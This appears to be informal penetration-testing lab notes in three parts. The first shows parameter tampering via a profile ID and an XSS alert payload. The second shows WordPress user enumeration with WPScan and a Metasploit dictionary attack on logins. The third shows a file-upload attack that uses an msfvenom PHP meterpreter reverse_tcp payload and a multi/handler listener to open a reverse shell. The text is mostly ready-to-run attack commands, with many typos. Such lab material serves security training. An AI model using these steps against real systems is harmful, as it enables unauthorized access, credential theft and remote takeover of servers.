###Exploiting Parameter Tampering and XSS Vulnerabilities in Web Applications###

visit http://www.example.com

In the login page, enter username: john, password: test
After login, vie Profile. After redirecting to the profile page for John, you see there is "ID" in the url data is setto a number.

Now try to change the ID from 2 to 1 and press Enter, you will be redirected to another user profile called "Sam". Now try other ID numbers, you get different user profiles. 

Note: This proces of changing the ID values and getting the result is known as PARAMETER TAMPERING. 
Web cross-site scripting (XSS or CSS) attacks exploits vulnerabilities in dynamically geenerated web pages. This enables malicious attackers to inject client-slide scripts
into web pages viewed by other users.
Inject <script>alert("Hacked")</script> into any fields, suchas contacts or login info. If this were to be successful, then you will receive a pop-up displaying the message
"Hacked" 

###Enumerating and Hacking a Web Application using WPScan and Metasploit###


In Kali Linux

wpscan --url http://example.com/ --enumerate -u 

To launch msfconsole, we need to enable postgresql service. Service postgresql start

Then, msfconsoole. 
wodpress_login_enum auxiliary module
use auxiliary/scanner/http/wordpress_login_enum 
 *This module allows to enumerate wordpress login creds. 
 Now, show options
 set PASS_FILE Password.txt (We will be performing the dictionary attack) 
 set RHOSTs <Ip of the Target> 
 set Rport <port of the machine  i.e., 80> 
 
 set TARGETURI <path to the login page> 
 
 set USERNAME <username> 
 Finally, run. 
 
 ###Exploiting File Upload Vulnerability at Different Security Levels###
 
 Requirements: Windows server to run WAMPServer
 In Kali linux, we generate a payload. 
 msfvenom -p phpmeterpreter/reverse_tcp lhost=<ip address> lport=4444 -f raw
 *Now copy the payload and save to a file with .php extension because we will be exploiting php server. Now go the the server you want to upload your generated php
 payload and upload the file. 
 
 In order to intercept the request send to the server, we need to setup meterpreter server. 
 
 type msfconsole
 use multi/handler
 set payload php/meterpreter/reverse_tcp
 set lhost <host ip> 
 set lport <host port to listen to> 
 run 
 
 Since the meterpreter session is running, now call the file you just uploaded in order to create a reverse shell. 
 
 This can be accomplished by simply, typing http://example.com/upload/files/paload.php
 And this will give us the meterpreter session.
